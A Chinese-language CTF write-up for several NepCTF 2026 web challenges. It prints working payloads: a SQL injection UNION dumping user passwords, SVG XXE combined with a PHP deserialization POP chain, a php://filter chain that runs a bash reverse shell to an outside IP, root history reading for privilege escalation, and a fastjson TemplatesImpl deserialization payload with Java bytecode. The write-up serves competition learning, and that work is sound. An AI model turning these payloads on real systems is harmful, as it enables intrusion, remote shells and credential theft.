---
title: NepCTF2026 web部分
date: 2026-07-21 17:02:33
tags:
---

第一次在公众号发wp，各位佬轻点喷

## 挂钩都在干什么呢？

题目给出了源码，我们先来看环境配置

```bash
echo $FLAG > /flag      # 把环境变量里的 FLAG 写到 /flag
chmod 777 /flag          # 所有人都能读
exec npm run start       # 启动 Vite dev server (6.4.1, 暴露 0.0.0.0:5173)
```

前端使用了Vite，版本是6.4.1

我们访问网站。发现前端展示了三角洲行动航天基地的挂钩们实时在干的事情。经过搜索发现有一模一样的项目。

![image-20260804194626777](https://gitee.com/bobrocket/img/raw/master/image-20260804194626777.png)

这不禁使我联想到了新春杯的终末地拼图生成器，推测这个题的入口也是在框架版本上。

果然找到了CVE-2026-39363

![image-20260804194903227](https://gitee.com/bobrocket/img/raw/master/image-20260804194903227.png)

上网找了一圈发现没有能直接拿来用的exp，我用ds开发了一个，需要自取。

[sunynov/CVE-2026-39363: 方便实用的CVE-2026-39363利用工具](https://github.com/sunynov/CVE-2026-39363)

![image-20260804230350015](https://gitee.com/bobrocket/img/raw/master/image-20260804230350015.png)

## web?re?

一个图片管理系统，我们先注册一个账号。没发现什么可以利用的功能，也不能上传图片，用户列表里面有admin账户，应该是需要拿到管理员密码。

![image-20260805102327164](https://gitee.com/bobrocket/img/raw/master/image-20260805102327164.png)

有一个同域名用户推荐的功能，推测是截取了@后面的内容进行了SQL查询

```
x@' UNION SELECT 1, username, password FROM users--
```

![image-20260805102807581](https://gitee.com/bobrocket/img/raw/master/image-20260805102807581.png)

成功拿到了admin用户的密码，登录后发现可以上传图片，有svg类型，所以尝试svg xxe。

也是成功读取了文件，但是读不到/flag，我们在/etc/passwd中能发现一些有关apache的信息，我们探测一下内网127.0.0.1，发现果然有一个php服务。

```php
class test{
    public $readflag;
    public $f;
    public $key;
    public function __construct(){
        $this->readflag=new class{
            public function __construct(){
                if(isset($_GET['file'])){
                    $GLOBALS['file']=$_GET['file'];
                }
            }
            public function __wakeup(){
                phpinfo();
            }
            public function readflag(){
                function readflag(){
                    if(isset($GLOBALS['file'])){
                        $file=$GLOBALS['file'];
                        base64_encode(include($file));
                    }
                }
            }
        };
    }
    public function __wakeup(){
        if(is_array($this->f)){
            $new=[];
            foreach($this->f as $k=>$v){
                if(is_string($v)){
                    $new[$k]=strval($v);
                }elseif(is_object($v)){
                    $new[$k]=clone $v;
                }else{
                    $new[$k]=$v;
                }
            }
            $this->f=$new;
        }
        if(is_string($this->readflag)){
            $this->readflag=strval($this->readflag);
        }
        if(is_string($this->key)){
            $this->key=strval($this->key);
        }
    }
    public function __destruct(){
        $func=$this->f;
        $GLOBALS['filename']=$this->readflag;
        if($this->key=='class'){
            new $func();
        }else if($this->key=='func'){
            $func();
        }else{
            echo base64_encode(file_get_contents('index.php'));
        }
    }
}
$ser=isset($_GET['land'])?$_GET['land']:'O:4:"test":N';
@unserialize($ser);
```

强网杯ez_php的简配版，后续应该会出一篇文章深入研究一下

```
i:0  A  key=class  f="test"
        → new test()
        → 定义匿名类 + $GLOBALS['file']=$_GET['file']

i:1  B  key=func   f=[anonName, "readflag"]
        → 匿名类::readflag()
        → 注册全局 function readflag(){ include(...) }

i:2  C  key=func   f="readflag"
        → readflag()
        → include($GLOBALS['file'])
```

poc

```php
<?php
class test {
    public $readflag;
    public $f;
    public $key;
}

$anon = "class@anonymous\0/var/www/html/index.php(1) : eval()'d code:1\$0";

$a = new test();
$a->f = 'test';
$a->key = 'class'; // 先 new

$b = new test();
$b->f = [$anon,'readflag'];
$b->key = 'func'; // 再注册

$c = new test();
$c->f = 'readflag';
$c->key = 'func';  // 最后调用

// 顺序必须 [A, B, C]，对应析构 i0→i1→i2
echo urlencode(serialize([$a, $b, $c]));
```

那么下面就是文件包含了，由于这个题没有设置open_basedir，所以我们可以直接包含上传的svg（非预期）

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/?file=%2Fapp%2Fuploads%2F2_20260806144213.svg&land=a%3A3%3A%7Bi%3A0%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Di%3A1%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A62%3A%22class%40anonymous%00%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%240%22%3Bi%3A1%3Bs%3A8%3A%22readflag%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Di%3A2%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A8%3A%22readflag%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7D%7D">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <text x="1" y="1">&xxe;</text>
</svg>
```

预期解的话是打php filter chain

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/?land=a%3A3%3A%7Bi%3A0%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Di%3A1%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A62%3A%22class%40anonymous%00%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%240%22%3Bi%3A1%3Bs%3A8%3A%22readflag%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Di%3A2%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A8%3A%22readflag%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7D%7D&file=php://filter/convert.iconv.UTF8.CSISO2022KR/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CSGB2312.UTF-32/convert.iconv.IBM-1161.IBM932/convert.iconv.GB13000.UTF16BE/convert.iconv.864.UTF-32LE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.GBK.UTF-8/convert.iconv.IEC_P27-1.UCS-4LE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.865.UTF16/convert.iconv.CP901.ISO6937/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.MS932.MS936/convert.iconv.BIG5.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.851.UTF-16/convert.iconv.L1.T.618BIT/convert.iconv.ISO-IR-103.850/convert.iconv.PT154.UCS4/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.GBK.SJIS/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.PT.UTF32/convert.iconv.KOI8-U.IBM-932/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CP-AR.UTF16/convert.iconv.8859_4.BIG5HKSCS/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.IBM869.UTF16/convert.iconv.L3.CSISO90/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.CP950.SHIFT_JISX0213/convert.iconv.UHC.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CP861.UTF-16/convert.iconv.L4.GB13000/convert.iconv.BIG5.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.L5.UTF-32/convert.iconv.ISO88594.GB13000/convert.iconv.CP950.SHIFT_JISX0213/convert.iconv.UHC.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.GBK.BIG5/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CP1162.UTF32/convert.iconv.L4.T.61/convert.iconv.ISO6937.EUC-JP-MS/convert.iconv.EUCKR.UCS-4LE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.PT.UTF32/convert.iconv.KOI8-U.IBM-932/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM921.NAPLPS/convert.iconv.855.CP936/convert.iconv.IBM-932.UTF-8/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CN.ISO2022KR/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.JS.UNICODE/convert.iconv.L4.UCS2/convert.iconv.UCS-2.OSF00030010/convert.iconv.CSIBM1008.UTF32BE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CSGB2312.UTF-32/convert.iconv.IBM-1161.IBM932/convert.iconv.GB13000.UTF16BE/convert.iconv.864.UTF-32LE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.BIG5HKSCS.UTF16/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.PT.UTF32/convert.iconv.KOI8-U.IBM-932/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.BIG5HKSCS.UTF16/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM921.NAPLPS/convert.iconv.855.CP936/convert.iconv.IBM-932.UTF-8/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.8859_3.UTF16/convert.iconv.863.SHIFT_JISX0213/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CP1046.UTF16/convert.iconv.ISO6937.SHIFT_JISX0213/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CP1046.UTF32/convert.iconv.L6.UCS-2/convert.iconv.UTF-16LE.T.61-8BIT/convert.iconv.865.UCS-4LE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.MAC.UTF16/convert.iconv.L8.UTF16BE/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.CSIBM1161.UNICODE/convert.iconv.ISO-IR-156.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.INIS.UTF16/convert.iconv.CSIBM1133.IBM943/convert.iconv.IBM932.SHIFT_JISX0213/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.iconv.SE2.UTF-16/convert.iconv.CSIBM1161.IBM-932/convert.iconv.MS932.MS936/convert.iconv.BIG5.JOHAB/convert.base64-decode/convert.base64-encode/convert.iconv.UTF8.UTF7/convert.base64-decode/resource=/etc/passwd&1=system('bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F183.66.27.22%2F18546%200%3E%261%22');">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <text x="1" y="1">&xxe;</text>
</svg>
```

这里打一个反弹shell，一顿翻发现找不到flag。拿到的权限是www-data，所以先看看能不能提权一下。

```
find / -user root -perm -4000 -print 2>/dev/null
```

![image-20260806170735544](https://gitee.com/bobrocket/img/raw/master/image-20260806170735544.png)

使用xxd查看root的环境变量和历史命令

```
xxd /root/.bashrc
xxd /root/.bash_history
```

![image-20260806170929523](https://gitee.com/bobrocket/img/raw/master/image-20260806170929523.png)

发现历史命令里面有一个sendtheflag，它会读取环境变量里面的SEND_KEY然后解密flag发送到80端口，因此这里设置环境变量然后运行查看日志即可。

```
export SEND_KEY=97b2d087-c452-4a14-8a91-5a7035b4ab38
/usr/local/bin/sendthef1ag
xxd /var/log/apache2/access.log
```

## 文件编辑系统

依旧是一个登录页面，注册的时候发现admin用户存在，直接能爆破密码admin123

普通用户只能预览文档而admin用户可以写文档

在保存文档的时候发送了一个json，通过探测发现这是一个java web并且后台使用了fastjson解析json，fastjson也是低版本1.2.x

![image-20260806175721500](https://gitee.com/bobrocket/img/raw/master/image-20260806175721500.png)

我们直接构造一个恶意json即可

```json
{
  "docId": 2,
  "title": "flag-trigger",
  "status": "draft",
  "content": "FLAG-TRIGGER",
  "probe": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [
      "<Base64编码的字节码>"
    ],
    "_name": "flag",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```

由于这里的环境不出网，但是用户可以查看upload目录下的文件，这里直接把flag写入文件

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class GetFlag extends AbstractTranslet {
    static {
        try {
            String value = System.getenv("FLAG");
            if (value == null) {
                value = "FLAG_ENV_NOT_SET";
            }
            java.nio.file.Path dir = java.nio.file.Paths.get("upload");
            java.nio.file.Files.createDirectories(dir);
            java.nio.file.Files.write(
                    dir.resolve("flag.txt"),
                    value.getBytes("UTF-8")
            );
        } catch (Exception ignored) {
        }
    }

    public void transform(
            DOM document,
            SerializationHandler[] handlers
    ) throws TransletException {
    }

    public void transform(
            DOM document,
            DTMAxisIterator iterator,
            SerializationHandler handler
    ) throws TransletException {
    }
}
```

![image-20260806175937648](https://gitee.com/bobrocket/img/raw/master/image-20260806175937648.png)

## JavaMix

超出能力范围了，有机会一定回来复现



## 参考文献

[第九届强网杯(2025)-ezphp | tiran's blog](https://www.tiran.cc/2025/11/07/第九届强网杯-2025-ezphp/)

[NepCTF 2026 官方wp来喽！](https://mp.weixin.qq.com/s/905ZtUrc2MXUmWmABa9zjQ)

[NepCTF 2026 (Web)](https://mp.weixin.qq.com/s/rkcu2IhUB9dghuZJFeeouw)
